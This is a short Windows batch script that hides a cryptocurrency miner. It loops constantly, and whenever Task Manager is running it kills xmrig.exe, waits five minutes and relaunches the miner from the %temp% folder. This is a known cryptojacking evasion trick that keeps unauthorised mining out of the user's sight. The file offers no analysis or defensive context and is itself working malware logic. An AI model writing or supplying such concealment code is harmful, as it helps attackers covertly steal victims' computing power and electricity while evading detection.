@echo off
:loop
tasklist /FI "IMAGENAME eq taskmgr.exe" /FI "STATUS eq running" | find /I "taskmgr.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im xmrig.exe >nul 2>&1
    timeout /t 300 /nobreak >nul
    start "" "%temp%\xmrig.exe"
)
timeout /t 5 /nobreak >nul
goto loop
